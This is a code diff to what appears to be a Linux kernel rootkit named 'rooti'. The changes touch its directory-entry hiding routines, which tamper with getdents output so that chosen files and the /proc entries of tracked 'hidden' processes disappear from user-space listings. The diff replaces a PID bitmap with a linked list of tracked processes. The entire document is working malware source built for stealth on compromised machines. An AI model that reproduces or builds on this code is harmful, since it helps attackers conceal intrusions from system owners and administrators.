@@ -2,6 +2,7 @@
 #include <linux/dirent.h>
 #include <linux/string.h>
 #include "dentry.h"
+#include "../tracking/process.h"
 #include "../../utils.h"
 #include "../../config.h"
 
@@ -61,9 +62,10 @@ static bool rooti_should_hide_file(struct linux_dirent64 *record)
 }
 
 // Determines whether the process (file in /proc) qualifies to be hidden
-static bool rooti_should_hide_proc(struct linux_dirent64 *record, unsigned char *pid_bitmap)
+static bool rooti_should_hide_proc(struct linux_dirent64 *record, struct list_head *tracked_procs)
 {    
     pid_t pid;
+    struct rooti_tracked_proc *proc;
 
     // Try to convert the name of the file to a PID (if the file is even a PID file)
     int err = kstrtoint(record->d_name, 0, &pid);
@@ -71,8 +73,8 @@ static bool rooti_should_hide_proc(struct linux_dirent64 *record, unsigned char 
         return false;
     }
 
-    // Check if the bit corresponding to the PID is set
-    return (pid_bitmap[pid / 8] >> pid % 8) & 1U;
+    proc = rooti_search_tracked_proc(pid, tracked_procs);
+    return proc != NULL && test_bit(ROOTI_PROC_HIDDEN, &proc->attrs);
 }
 
 /*
@@ -99,7 +101,8 @@ static size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct 
     Filters out all entries that should be hidden from the results buffer.
     The updated size of the buffer is returned.
 */
-static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_t count, bool is_proc_dir, unsigned char *pid_bitmap)
+static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_t count, bool is_proc_dir,
+                                       struct list_head *tracked_procs)
 {
     struct linux_dirent64 *curr_record = NULL;
     struct linux_dirent64 *prev_record = NULL;
@@ -108,7 +111,7 @@ static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_
     while (offset < count) {
         curr_record = (void *)records_buf + offset;
         // Check if the current record should be hidden
-        if (rooti_should_hide_file(curr_record) || (is_proc_dir && rooti_should_hide_proc(curr_record, pid_bitmap))) {
+        if (rooti_should_hide_file(curr_record) || (is_proc_dir && rooti_should_hide_proc(curr_record, tracked_procs))) {
             count = rooti_filter_dir_entry(curr_record, prev_record, count);
             if (curr_record == records_buf) {
                 continue;
@@ -125,7 +128,8 @@ static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_
     Rigs the results of getdents by copying the results buffer into kernel space, filtering out any
     entries that should be hidden and copying the rigged results back to user space.
 */
-size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir, unsigned char *pid_bitmap)
+size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir,
+                              struct list_head *tracked_procs)
 {
     // Allocate a kernel buffer to store the data returned to user
     struct linux_dirent64 *kernel_buf = kmalloc(count, GFP_KERNEL);
@@ -143,7 +147,7 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
     }
 
     // Tamper with the returned records, concealing any files we wish to hide 
-    count = rooti_filter_dir_entries(kernel_buf, count, is_proc_dir, pid_bitmap);
+    count = rooti_filter_dir_entries(kernel_buf, count, is_proc_dir, tracked_procs);
 
     // Copy the rigged buffer back to userspace
     err = copy_to_user(user_buf, kernel_buf, count);
